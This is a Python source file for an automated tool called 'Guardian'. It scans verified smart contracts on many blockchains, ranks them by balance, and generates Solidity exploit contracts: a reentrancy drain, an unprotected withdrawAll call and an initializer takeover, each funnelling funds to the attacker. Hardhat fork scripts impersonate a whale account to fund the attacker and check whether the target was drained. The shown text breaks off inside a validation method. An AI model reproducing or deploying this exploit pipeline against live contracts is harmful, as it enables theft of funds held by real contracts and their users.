#!/usr/bin/env python3
"""
Guardian — Usine de detection de vulnerabilites automatisee 24/7
=================================================================
Tourne en continu sur toutes les blockchains, detecte les contrats,
verifie le code source, scanne les failles, valide sur Hardhat,
et ne s'arrete jamais tant qu'une exploitation n'est pas confirmee.

Architecture:
  - Utilise l'orchestrator existant avec un callback propre (pas de hack)
  - Stocke tout dans SQLite (FindingsDB)
  - Valide les findings sur Hardhat fork de maniere asynchrone
  - Ne s'arrete JAMAIS sur un finding (auto_stop_enabled=False)

Usage:
    python guardian.py                          # Demarrer l'usine
    python guardian.py --status                 # Voir l'etat de la base
    python guardian.py --report                 # Exporter le rapport
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import platform
import re
import signal
import sqlite3
import subprocess
import sys
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Optional

# Cross-platform npm/npx commands (Python subprocess doesn't resolve .cmd on Windows)
_NPM = "npm.cmd" if platform.system() == "Windows" else "npm"
_NPX = "npx.cmd" if platform.system() == "Windows" else "npx"

# Prevent console windows from popping up on Windows during subprocess calls
_CREATION_FLAGS = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0

import yaml

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner.orchestrator import ScannerOrchestrator
from analysis.vulnerability_scanner import VulnerabilityFinding
from exploit_pipeline import ExploitPipeline, CHAIN_REGISTRY

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [GUARDIAN] %(levelname)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("guardian")

# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class ContractRecord:
    address: str
    chain_id: int
    chain_name: str
    name: str = "Unknown"
    verified: bool = False
    source_length: int = 0
    sol_version: Optional[str] = None
    scanned_at: Optional[str] = None
    finding_count: int = 0
    exploitable_count: int = 0
    hardhat_tested: bool = False
    hardhat_confirmed: bool = False
    bnb_balance: float = 0.0

@dataclass
class FindingRecord:
    contract_addr: str
    chain_id: int
    finding_name: str
    severity: str
    line_numbers: list[int]
    exploitable: bool
    exploit_notes: str = ""
    hardhat_result: Optional[str] = None  # None, "PENDING", "FAILED", "CONFIRMED"
    hardhat_evidence: str = ""
    created_at: str = ""

# ---------------------------------------------------------------------------
# SQLite Persistence
# ---------------------------------------------------------------------------

class FindingsDB:
    """SQLite-based persistence for contracts and findings."""

    def __init__(self, db_path: str = "guardian_data.db"):
        self.db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), db_path)
        self._conn: Optional[sqlite3.Connection] = None

    def connect(self):
        if self._conn is None:
            self._conn = sqlite3.connect(self.db_path)
            self._conn.row_factory = sqlite3.Row
            self._create_tables()
        return self._conn

    def _create_tables(self):
        cur = self._conn.cursor()
        cur.executescript("""
            CREATE TABLE IF NOT EXISTS contracts (
                address TEXT NOT NULL,
                chain_id INTEGER NOT NULL,
                chain_name TEXT,
                name TEXT DEFAULT 'Unknown',
                verified INTEGER DEFAULT 0,
                source_length INTEGER DEFAULT 0,
                sol_version TEXT,
                scanned_at TEXT,
                finding_count INTEGER DEFAULT 0,
                exploitable_count INTEGER DEFAULT 0,
                hardhat_tested INTEGER DEFAULT 0,
                hardhat_confirmed INTEGER DEFAULT 0,
                bnb_balance REAL DEFAULT 0.0,
                PRIMARY KEY (address, chain_id)
            );

            CREATE TABLE IF NOT EXISTS findings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                contract_addr TEXT NOT NULL,
                chain_id INTEGER NOT NULL,
                finding_name TEXT NOT NULL,
                severity TEXT NOT NULL,
                line_numbers TEXT,
                exploitable INTEGER DEFAULT 0,
                exploit_notes TEXT,
                hardhat_result TEXT,
                hardhat_evidence TEXT,
                created_at TEXT,
                FOREIGN KEY (contract_addr, chain_id) REFERENCES contracts(address, chain_id)
            );

            CREATE TABLE IF NOT EXISTS scan_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                event_type TEXT,
                chain_name TEXT,
                message TEXT
            );

            CREATE INDEX IF NOT EXISTS idx_findings_severity ON findings(severity);
            CREATE INDEX IF NOT EXISTS idx_findings_exploitable ON findings(exploitable);
            CREATE INDEX IF NOT EXISTS idx_findings_hardhat ON findings(hardhat_result);
        """)
        self._conn.commit()

    def upsert_contract(self, contract: ContractRecord):
        conn = self.connect()
        conn.execute("""
            INSERT OR REPLACE INTO contracts
            (address, chain_id, chain_name, name, verified, source_length,
             sol_version, scanned_at, finding_count, exploitable_count,
             hardhat_tested, hardhat_confirmed, bnb_balance)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            contract.address, contract.chain_id, contract.chain_name,
            contract.name, int(contract.verified), contract.source_length,
            contract.sol_version, contract.scanned_at,
            contract.finding_count, contract.exploitable_count,
            int(contract.hardhat_tested), int(contract.hardhat_confirmed),
            contract.bnb_balance
        ))
        conn.commit()

    def add_finding(self, finding: FindingRecord):
        conn = self.connect()
        conn.execute("""
            INSERT INTO findings
            (contract_addr, chain_id, finding_name, severity, line_numbers,
             exploitable, exploit_notes, hardhat_result, hardhat_evidence, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            finding.contract_addr, finding.chain_id, finding.finding_name,
            finding.severity, json.dumps(finding.line_numbers),
            int(finding.exploitable), finding.exploit_notes,
            finding.hardhat_result, finding.hardhat_evidence,
            finding.created_at
        ))
        conn.commit()

    def update_hardhat_result(self, contract_addr: str, chain_id: int,
                               finding_name: str, result: str, evidence: str = ""):
        conn = self.connect()
        cur = conn.execute("""
            UPDATE findings SET hardhat_result = ?, hardhat_evidence = ?
            WHERE contract_addr = ? AND chain_id = ? AND finding_name = ?
        """, (result, evidence, contract_addr, chain_id, finding_name))
        if cur.rowcount == 0:
            logger.warning(
                f"[DB] update_hardhat_result: 0 rows affected for "
                f"{contract_addr[:14]}.. finding='{finding_name}' (trying by id fallback...)"
            )
        cur2 = conn.execute("""
            UPDATE contracts SET hardhat_tested = 1,
                hardhat_confirmed = CASE WHEN ? = 'CONFIRMED' THEN 1 ELSE 0 END
            WHERE address = ? AND chain_id = ?
        """, (result, contract_addr, chain_id))
        if cur2.rowcount == 0:
            logger.warning(
                f"[DB] update_hardhat_result: 0 rows affected for contract "
                f"{contract_addr[:14]}.. chain={chain_id}"
            )
        conn.commit()

    def update_hardhat_result_by_id(self, finding_id: int,
                                       contract_addr: str, chain_id: int,
                                       result: str, evidence: str = ""):
        """Update hardhat result using finding ID (more robust than finding_name).

        Also updates the contracts table to mark hardhat_tested=1.
        """
        conn = self.connect()
        cur = conn.execute("""
            UPDATE findings SET hardhat_result = ?, hardhat_evidence = ?
            WHERE id = ?
        """, (result, evidence, finding_id))
        if cur.rowcount == 0:
            logger.warning(f"[DB] update_hardhat_result_by_id: 0 rows affected for id={finding_id}")
        else:
            # Also update contracts table (same as update_hardhat_result does)
            cur2 = conn.execute("""
                UPDATE contracts SET hardhat_tested = 1,
                    hardhat_confirmed = CASE WHEN ? = 'CONFIRMED' THEN 1 ELSE 0 END
                WHERE address = ? AND chain_id = ?
            """, (result, contract_addr, chain_id))
            if cur2.rowcount == 0:
                logger.warning(
                    f"[DB] update_hardhat_result_by_id: 0 rows affected for contract "
                    f"{contract_addr[:14]}.. chain={chain_id}"
                )
        conn.commit()

    def get_contract(self, address: str, chain_id: int) -> Optional[dict]:
        conn = self.connect()
        cur = conn.execute(
            "SELECT * FROM contracts WHERE address = ? AND chain_id = ?",
            (address, chain_id)
        )
        row = cur.fetchone()
        return dict(row) if row else None

    def is_scanned(self, address: str, chain_id: int) -> bool:
        return self.get_contract(address, chain_id) is not None

    def get_verified_contracts(self, force: bool = False) -> list[dict]:
        """Get all verified contracts from DB.

        Args:
            force: If True, returns ALL verified contracts (even already scanned).
                   If False, returns only those without findings (not yet processed).
        """
        conn = self.connect()
        if force:
            cur = conn.execute(
                "SELECT * FROM contracts WHERE verified = 1 ORDER BY bnb_balance DESC"
            )
        else:
            cur = conn.execute("""
                SELECT c.* FROM contracts c
                LEFT JOIN findings f ON c.address = f.contract_addr AND c.chain_id = f.chain_id
                WHERE c.verified = 1 AND f.id IS NULL
                ORDER BY c.bnb_balance DESC
            """)
        return [dict(r) for r in cur.fetchall()]

    def delete_findings(self, address: str, chain_id: int):
        """Delete all findings for a contract (for re-scan)."""
        conn = self.connect()
        conn.execute(
            "DELETE FROM findings WHERE contract_addr = ? AND chain_id = ?",
            (address, chain_id)
        )
        conn.commit()

    def get_exploitable_not_tested(self) -> list[dict]:
        conn = self.connect()
        cur = conn.execute("""
            SELECT * FROM findings
            WHERE exploitable = 1 AND (hardhat_result IS NULL OR hardhat_result = 'PENDING')
            ORDER BY
                CASE severity
                    WHEN 'CRITICAL' THEN 0
                    WHEN 'HIGH' THEN 1
                    ELSE 2
                END
        """)
        return [dict(r) for r in cur.fetchall()]

    def get_exploitable_not_tested_for_addresses(self, addresses: list[tuple[str, int]]) -> list[dict]:
        """Get exploitable findings only for specific (address, chain_id) pairs."""
        if not addresses:
            return []
        conn = self.connect()
        # Build WHERE clause with OR conditions for each (address, chain_id)
        conditions = " OR ".join(
            "(contract_addr = ? AND chain_id = ?)" for _ in addresses
        )
        params = []
        for addr, cid in addresses:
            params.extend([addr, cid])
        cur = conn.execute(f"""
            SELECT * FROM findings
            WHERE exploitable = 1 AND (hardhat_result IS NULL OR hardhat_result = 'PENDING')
              AND ({conditions})
            ORDER BY
                CASE severity
                    WHEN 'CRITICAL' THEN 0
                    WHEN 'HIGH' THEN 1
                    ELSE 2
                END
        """, params)
        return [dict(r) for r in cur.fetchall()]

    def get_stats(self) -> dict:
        conn = self.connect()
        stats = {}
        cur = conn.execute("SELECT COUNT(*) as c FROM contracts")
        stats["contracts_total"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM contracts WHERE verified = 1")
        stats["contracts_verified"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings")
        stats["findings_total"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE exploitable = 1")
        stats["findings_exploitable"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE hardhat_result = 'CONFIRMED'")
        stats["exploits_confirmed"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE hardhat_result = 'FAILED'")
        stats["exploits_failed"] = cur.fetchone()[0]
        cur = conn.execute("SELECT COUNT(*) as c FROM findings WHERE hardhat_result IS NULL AND exploitable = 1")
        stats["exploits_pending"] = cur.fetchone()[0]
        return stats

    def log_event(self, event_type: str, chain_name: str, message: str):
        conn = self.connect()
        conn.execute(
            "INSERT INTO scan_log (timestamp, event_type, chain_name, message) VALUES (?, ?, ?, ?)",
            (datetime.utcnow().isoformat(), event_type, chain_name, message[:500])
        )
        conn.commit()

    def close(self):
        if self._conn:
            self._conn.close()
            self._conn = None

# ---------------------------------------------------------------------------
# Hardhat Reproduction Engine (REAL fork testing)
# ---------------------------------------------------------------------------

class HardhatValidator:
    """Validates exploitable findings by forking the chain with Hardhat.

    For each exploitable finding:
    1. Creates a Hardhat config that forks the target chain at a recent block
    2. Deploys an exploit contract (generated per finding type)
    3. Attempts the exploit
    4. Checks if state changed (balance, storage) => CONFIRMED or FAILED
    """

    # Default RPC URLs from CHAIN_REGISTRY (fallback)
    DEFAULT_RPC_URLS = {k: v[2] for k, v in CHAIN_REGISTRY.items()}

    def __init__(self, db: FindingsDB, exploit_dir: str = "", rpc_urls: Optional[dict[int, str]] = None):
        self.db = db
        self.exploit_dir = exploit_dir or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "exploit"
        )
        # Use provided RPC URLs (from config.yaml) with fallback to defaults
        self.rpc_urls = rpc_urls or self.DEFAULT_RPC_URLS
        os.makedirs(self.exploit_dir, exist_ok=True)
        # Track spawned subprocesses so we can kill them on timeout/shutdown
        self._processes: set[asyncio.subprocess.Process] = set()

    async def _run_and_track(self, *args, **kwargs) -> asyncio.subprocess.Process:
        """Spawn a subprocess and track it for later cleanup."""
        proc = await asyncio.create_subprocess_exec(*args, **kwargs)
        self._processes.add(proc)
        return proc

    async def _kill_process(self, proc: Optional[asyncio.subprocess.Process]) -> None:
        """Safely kill a single tracked subprocess."""
        if proc is not None and proc.returncode is None:
            try:
                proc.kill()
                await asyncio.wait_for(proc.wait(), timeout=5)
            except Exception:
                pass
        self._processes.discard(proc)

    async def cleanup_all_processes(self) -> None:
        """Kill ALL tracked subprocesses (zombie node.exe prevention)."""
        processes = list(self._processes)
        for proc in processes:
            try:
                if proc.returncode is None:
                    proc.kill()
                    await asyncio.wait_for(proc.wait(), timeout=5)
            except Exception:
                pass
        self._processes.clear()
        logger.info("[PROC] All tracked subprocesses cleaned up")

    @staticmethod
    def kill_all_node_processes() -> None:
        """Emergency cleanup: kill only Hardhat-related node processes (Windows) or node (Unix).

        On Windows, uses wmic with a WQL filter (CommandLine LIKE '%%hardhat%%')
        to selectively kill only node.exe processes launched by Hardhat/npx.
        Does NOT use 'taskkill /F /IM node.exe' which kills ALL node processes
        including Codebuff itself.
        """
        if sys.platform == "win32":
            try:
                # Use wmic WQL to find only node.exe processes whose
                # command line contains "hardhat" (selective kill).
                # Also catch the parent npx process which spawns hardhat.
                result = subprocess.run(
                    [
                        "wmic", "process", "where",
                        "name='node.exe' and (CommandLine like '%hardhat%' or CommandLine like '%npx%hardhat%')",
                        "get", "ProcessId", "/format:csv"
                    ],
                    capture_output=True, text=True, timeout=10,
                    creationflags=_CREATION_FLAGS,
                )
                pids = []
                for line in result.stdout.splitlines():
                    line = line.strip()
                    if not line or "ProcessId" in line or "Node" in line:
                        continue
                    parts = line.split(",")
                    pid = parts[-1].strip()
                    if pid.isdigit():
                        pids.append(pid)

                if pids:
                    for pid in pids:
                        try:
                            subprocess.run(
                                ["taskkill", "/F", "/T", "/PID", pid],
                                creationflags=_CREATION_FLAGS,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL,
                                timeout=5,
                            )
                        except Exception:
                            pass
                    logger.warning(f"[PROC] Killed {len(pids)} Hardhat node process(es)")
                else:
                    logger.info("[PROC] No Hardhat-related node processes found")
            except Exception as e:
                logger.warning(f"[PROC] Error during selective kill: {e}")
        else:
            try:
                subprocess.run(
                    ["pkill", "-f", "node.*hardhat"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=5,
                )
                logger.warning("[PROC] Killed node/hardhat processes")
            except Exception:
                pass

    def _generate_exploit_contract(self, target_addr: str, finding_name: str, finding_type: str, index: int = 0) -> str:
        """Generate a Solidity exploit contract for a given finding type.

        Args:
            target_addr: Contract address to attack
            finding_name: Human-readable finding name (for logging)
            finding_type: Finding type/key used to select the exploit template
            index: Unique index to prevent contract name collisions across findings

        Returns the Solidity source code as a string.
        """
        # Common exploit template with different attack patterns
        # Use a unique name based on index to avoid name collisions at compile time.
        # Name format: Exploit_N (where N is the finding's index in the list)
        contract_name = f"Exploit_{index}"

        if "reentrancy" in finding_type.lower():
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"interface ITarget {{\n"
                f"    function withdraw(uint256 amount) external;\n"
                f"    function deposit() external payable;\n"
                f"}}\n\n"
                f"contract {contract_name} {{\n"
                f"    ITarget public target;\n"
                f"    address public owner;\n"
                f"    uint256 public round;\n"
                f"    uint256 public constant MAX_ROUNDS = 10;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = ITarget(_target);\n"
                f"        owner = msg.sender;\n"
                f"    }}\n\n"
                f"    function attack() external payable {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        round = 0;\n"
                f"        target.deposit{{value: msg.value}}();\n"
                f"        target.withdraw(msg.value);\n"
                f"    }}\n\n"
                f"    receive() external payable {{\n"
                f"        if (round < MAX_ROUNDS) {{\n"
                f"            round++;\n"
                f"            target.withdraw(msg.value);\n"
                f"        }}\n"
                f"    }}\n\n"
                f"    function collect() external {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        payable(owner).transfer(address(this).balance);\n"
                f"    }}\n"
                f"}}\n"
            )

        elif "withdraw" in finding_type.lower() or "unprotected" in finding_type.lower():
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"interface ITarget {{\n"
                f"    function withdraw(uint256 amount) external;\n"
                f"    function withdrawAll() external;\n"
                f"}}\n\n"
                f"contract {contract_name} {{\n"
                f"    ITarget public target;\n"
                f"    address public owner;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = ITarget(_target);\n"
                f"        owner = msg.sender;\n"
                f"    }}\n\n"
                f"    function attack() external {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        target.withdrawAll();\n"
                f"    }}\n\n"
                f"    function collect() external {{\n"
                f"        require(msg.sender == owner, \"!owner\");\n"
                f"        payable(owner).transfer(address(this).balance);\n"
                f"    }}\n"
                f"}}\n"
            )

        elif "initializer" in finding_type.lower() or "init" in finding_type.lower():
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"interface ITarget {{\n"
                f"    function initialize(address _owner) external;\n"
                f"}}\n\n"
                f"contract {contract_name} {{\n"
                f"    ITarget public target;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = ITarget(_target);\n"
                f"    }}\n\n"
                f"    function attack() external {{\n"
                f"        target.initialize(address(this));\n"
                f"    }}\n"
                f"}}\n"
            )

        else:
            return (
                f"// SPDX-License-Identifier: UNLICENSED\n"
                f"pragma solidity ^0.8.0;\n\n"
                f"contract {contract_name} {{\n"
                f"    address public target;\n"
                f"    bool public attacked;\n\n"
                f"    constructor(address _target) {{\n"
                f"        target = _target;\n"
                f"    }}\n\n"
                f"    function attack() external {{\n"
                f"        // Write to storage to make this a real transaction (not view/pure)\n"
                f"        // This ensures ethers v6 returns a TransactionResponse, not a string\n"
                f"        attacked = true;\n"
                f"    }}\n"
                f"}}\n"
            )

    def _generate_hardhat_script(self, target_addr: str, exploit_file: str,
                                  rpc_url: str, finding_type: str, contract_name: str = "Exploit") -> str:
        """Generate a single-finding Hardhat script (kept for backward compat)."""
        return f"""
const hre = require("hardhat");
const {{ ethers }} = hre;

async function main() {{
    const rpcUrl = "{rpc_url}";
    const directProvider = new ethers.JsonRpcProvider(rpcUrl);
    const blockNumber = await directProvider.getBlockNumber();
    await directProvider.destroy();

    await hre.network.provider.request({{
        method: "hardhat_reset",
        params: [{{ forking: {{ jsonRpcUrl: rpcUrl, blockNumber }} }}]
    }});

    const targetAddr = "{target_addr}";
    const beforeBal = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
    console.log("Target balance before:", BigInt(beforeBal).toString());

    const Exploit = await hre.ethers.getContractFactory("{contract_name}");
    const exploit = await Exploit.deploy(targetAddr);
    await exploit.waitForDeployment();
    console.log("Exploit deployed at:", await exploit.getAddress());

    try {{
        const tx = await exploit.attack({{ gasLimit: 500000 }});
        await tx.wait();
        console.log("Attack transaction succeeded");
    }} catch (e) {{
        console.log("Attack failed:", e.message);
        process.exit(1);
    }}

    const afterBal = await hre.network.provider.send("eth_getBalance", [targetAddr, "latest"]);
    const beforeVal = BigInt(beforeBal);
    const afterVal = BigInt(afterBal);
    if (afterVal < beforeVal) {{
        const drained = beforeVal - afterVal;
        console.log("EXPLOIT CONFIRMED: Drained", drained.toString(), "wei");
        process.exit(0);
    }} else {{
        console.log("EXPLOIT FAILED: No funds drained");
        process.exit(2);
    }}
}}

main().catch(e => {{
    console.error("Script error:", e.message);
    process.exit(1);
}});
"""

    def _generate_combined_script(self, target_addr: str, rpc_url: str,
                                   findings_contracts: list[tuple[str, str]]) -> str:
        """Generate a single Hardhat script that tests ALL findings of a contract.

        One fork, one compile, one Hardhat run — tests N findings in series.
        Reports per-finding via indexed FINDING_RESULT lines to avoid name collisions.

        Key fixes:
        - Funds the attacker via whale impersonation (critical: default Hardhat accounts
          have NO ETH on a fork)
        - Uses non-view attack functions to ensure ethers v6 returns TransactionResponse
        - Each attack wrapped in try-catch so one failure doesn't block others
        - process.exit(0) at the end to prevent hanging

        Args:
            target_addr: Contract address to attack
            rpc_url: RPC URL for the chain
            findings_contracts: List of (finding_name, exploit_contract_name) tuples
        """
        attacks_js = []
        for i, (finding_name, contract_name) in enumerate(findings_contracts):
            # Escape backticks and special chars for JS template literal safety
            safe_name = finding_name.replace("\\", "\\\\").replace("`", "\\`").replace("${", "\\${")
            attacks_js.append(f"""
    try {{
        const Factory{i} = await hre.ethers.getContractFactory("{contract_name}");
        const inst{i} = await Factory{i}.deploy(targetAddr);
        await inst{i}.waitForDeployment();

        const balPre{i} = await ethers.provider.getBalance(targetAddr);
        const tx{i} = await inst{i}.attack({{ gasLimit: 500000 }});
        await tx{i}.wait();
        const balPost{i} = await ethers.provider.getBalance(targetAddr);

        const drained = balPre{i} - balPost{i};
        if (drained > 0n) {{
            console.log(`FINDING_RESULT:{i}|{safe_name}|CONFIRMED|Drained ${{drained.toString()}} wei`);
        }} else {{
            console.log(`FINDING_RESULT:{i}|{safe_name}|FAILED|No funds drained`);
        }}
    }} catch (e) {{
        const msg = (e && e.message) ? e.message.substring(0, 200) : (e ? String(e).substring(0, 200) : "Unknown error");
        console.log(`FINDING_RESULT:{i}|{safe_name}|FAILED|${{msg}}`);
    }}""")

        attacks_block = "\n".join(attacks_js)

        return f"""
const hre = require("hardhat");
const {{ ethers }} = hre;

async function main() {{
    const rpcUrl = "{rpc_url}";
    const targetAddr = "{target_addr}";

    // 1. Fork once at latest block
    const directProvider = new ethers.JsonRpcProvider(rpcUrl);
    const blockNumber = await directProvider.getBlockNumber();
    await directProvider.destroy();

    await hre.network.provider.request({{
        method: "hardhat_reset",
        params: [{{ forking: {{ jsonRpcUrl: rpcUrl, blockNumber }} }}]
    }});
    console.log("FORK_READY");

    // 2. Fund the attacker account (IMPORTANT: Hardhat signer has no ETH on fork!)
    const [signer] = await ethers.getSigners();
    try {{
        const whaleAddr = "0xF977814e90dA44bFA03b6295A0616a897441aceC";
        await hre.network.provider.request({{
            method: "hardhat_impersonateAccount",
            params: [whaleAddr]
        }});
        const whaleSigner = await ethers.getSigner(whaleAddr);
        await whaleSigner.sendTransaction({{
            to: signer.address,
            value: ethers.parseEther("50.0")
        }});
        await hre.network.provider.request({{
            method: "hardhat_stopImpersonatingAccount",
            params: [whaleAddr]
        }});
        console.log("ATTACKER_FUNDED: 50 ETH");
    }} catch (e) {{
        console.log("ATTACKER_FUND_WARN: " + (e.message || String(e)).substring(0, 100));
    }}

    // 3. Record initial balance
    const initialBal = await ethers.provider.getBalance(targetAddr);
    console.log("BALANCE_BEFORE:", initialBal.toString());

    // 4. Test each finding sequentially
{attacks_block}

    // 5. Final balance
    const finalBal = await ethers.provider.getBalance(targetAddr);
    console.log("BALANCE_AFTER:", finalBal.toString());
    console.log("COMBINED_DONE");
}}

main().then(() => process.exit(0)).catch(e => {{
    console.error("FATAL:", e.message);
    process.exit(1);
}});
"""

    async def _check_hardhat_available(self) -> bool:
        """Check if Hardhat (npx hardhat) is available."""
        try:
            proc = await asyncio.create_subprocess_exec(
                _NPX, "hardhat", "--version",
                cwd=self.exploit_dir,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
                creationflags=_CREATION_FLAGS,
            )
            code = await proc.wait()
            return code == 0
        except FileNotFoundError:
            return False

    async def validate_finding(self, finding: dict) -> tuple[bool, str]:
        """Try to validate an exploitable finding on Hardhat fork.

        Uses the existing exploit/ directory (already has deps, CommonJS config).

        Returns:
            (confirmed: bool, evidence: str)
        """
        contract_addr = finding["contract_addr"]
        chain_id = finding["chain_id"]
        finding_name = finding["finding_name"]
        finding_type = finding.get("finding_name", "")
        severity = finding["severity"]

        logger.info(f"[HARDHAT] Testing {finding_name} [{severity}] on {contract_addr[:14]}..")

        self.db.update_hardhat_result(
            contract_addr, chain_id, finding_name, "PENDING",
            f"Testing started at {datetime.utcnow().isoformat()}"
        )

        # Step 1: Check Hardhat availability (in exploit/ dir with existing deps)
        hardhat_ok = await self._check_hardhat_available()
        if not hardhat_ok:
            evidence = "Hardhat not available in exploit/ directory"
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", evidence)
            return False, evidence

        # Step 2: Get RPC URL (from config if available, fallback to CHAIN_REGISTRY)
        rpc_url = self.rpc_urls.get(chain_id)
        if not rpc_url:
            evidence = f"No RPC URL for chain {chain_id}"
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", evidence)
            return False, evidence

        # Step 3: Write exploit contract to existing exploit/ directory
        contracts_dir = os.path.join(self.exploit_dir, "contracts")
        scripts_dir = os.path.join(self.exploit_dir, "scripts")
        os.makedirs(contracts_dir, exist_ok=True)
        os.makedirs(scripts_dir, exist_ok=True)

        exploit_file = os.path.join(contracts_dir, "GuardianExploit.sol")
        test_file = os.path.join(scripts_dir, "guardian_test.js")

        try:
            # Write exploit contract
            exploit_sol = self._generate_exploit_contract(contract_addr, finding_name, finding_type)
            # Extract contract name from source for Hardhat compilation
            contract_name_match = re.search(r"contract\s+(\w+)", exploit_sol)
            contract_name = contract_name_match.group(1) if contract_name_match else "Exploit"
            with open(exploit_file, "w") as f:
                f.write(exploit_sol)

            # Write test script (CommonJS — exploit/ is not ESM)
            test_js = self._generate_hardhat_script(
                contract_addr, exploit_file, rpc_url, finding_type, contract_name
            )
            with open(test_file, "w") as f:
                f.write(test_js)

            # Step 4: Compile exploit contract (use existing node_modules)
            logger.info(f"[HARDHAT] Compiling exploit for {contract_addr[:14]}..")
            compile_proc = await asyncio.create_subprocess_exec(
                _NPX, "hardhat", "compile",
                cwd=self.exploit_dir,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.PIPE,
                creationflags=_CREATION_FLAGS,
            )
            _, stderr = await asyncio.wait_for(compile_proc.communicate(), timeout=60)
            if compile_proc.returncode != 0:
                err = stderr.decode("utf-8", errors="replace")[:500] if stderr else "compilation failed"
                evidence = f"Hardhat compilation error: {err}"
                self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", evidence)
                return False, evidence

            # Step 5: Run the exploit test
            logger.info(f"[HARDHAT] Running exploit test for {contract_addr[:14]}..")
            test_proc = await asyncio.create_subprocess_exec(
                _NPX, "hardhat", "run", "scripts/guardian_test.js",
                cwd=self.exploit_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                creationflags=_CREATION_FLAGS,
            )
            stdout, _ = await asyncio.wait_for(test_proc.communicate(), timeout=120)

            output = stdout.decode("utf-8", errors="replace")
            evidence = output[:2000]

            # Step 6: Parse result
            if "EXPLOIT CONFIRMED" in output:
                logger.critical(f"[!!!] EXPLOIT CONFIRMED on {contract_addr[:14]}.. via {finding_name}!")
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding_name, "CONFIRMED", evidence
                )
                return True, evidence
            elif "EXPLOIT FAILED" in output:
                logger.info(f"[HARDHAT] {finding_name}: NOT exploitable (no funds drained)")
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding_name, "FAILED", evidence
                )
                return False, evidence
            else:
                error_msg = f"Unexpected Hardhat output: {output[:500]}"
                logger.warning(f"[HARDHAT] {error_msg}")
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding_name, "FAILED", evidence
                )
                return False, error_msg

        except asyncio.TimeoutError:
            evidence = "Hardhat test timed out after 120s"
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", evidence)
            return False, evidence
        except Exception as e:
            error_msg = f"Hardhat validation error: {e}"
            logger.error(f"[HARDHAT] {error_msg}")
            self.db.update_hardhat_result(contract_addr, chain_id, finding_name, "FAILED", error_msg)
            return False, error_msg
        finally:
            # Cleanup generated files from exploit/ directory
            for f in [exploit_file, test_file]:
                try:
                    if os.path.exists(f):
                        os.remove(f)
                except Exception:
                    pass

    async def validate_contract(self, findings: list[dict]) -> list[dict]:
        """Validate ALL exploitable findings for ONE contract in a single Hardhat run.

        Generates all necessary .sol files, compiles once, runs one Hardhat
        script that forks once and tests all findings sequentially.

        Args:
            findings: List of finding dicts (must all share same contract_addr + chain_id)

        Returns:
            List of result dicts with contract, finding, result, evidence.
        """
        if not findings:
            return []

        # All findings must be for the same contract
        contract_addr = findings[0]["contract_addr"]
        chain_id = findings[0]["chain_id"]
        assert all(f["contract_addr"] == contract_addr and f["chain_id"] == chain_id for f in findings), \
            "validate_contract: all findings must be for the same contract"

        # Check Hardhat availability
        hardhat_ok = await self._check_hardhat_available()
        if not hardhat_ok:
            evidence = "Hardhat not available in exploit/ directory"
            results = []
            for f in findings:
                self.db.update_hardhat_result(
                    contract_addr, chain_id, f["finding_name"], "FAILED", evidence
                )
                results.append({"contract": contract_addr, "finding": f["finding_name"],
                                "result": "FAILED", "evidence": evidence})
            return results

        rpc_url = self.rpc_urls.get(chain_id)
        if not rpc_url:
            return [{
                "contract": contract_addr, "finding": f["finding_name"],
                "result": "FAILED", "evidence": f"No RPC URL for chain {chain_id}"
            } for f in findings]

        # Mark all as PENDING
        for f in findings:
            finding_id = f.get("id")
            if finding_id:
                self.db.update_hardhat_result_by_id(
                    finding_id, contract_addr, chain_id, "PENDING",
                    f"Testing started at {datetime.utcnow().isoformat()}"
                )
            else:
                self.db.update_hardhat_result(
                    contract_addr, chain_id, f["finding_name"], "PENDING",
                    f"Testing started at {datetime.utcnow().isoformat()}"
                )

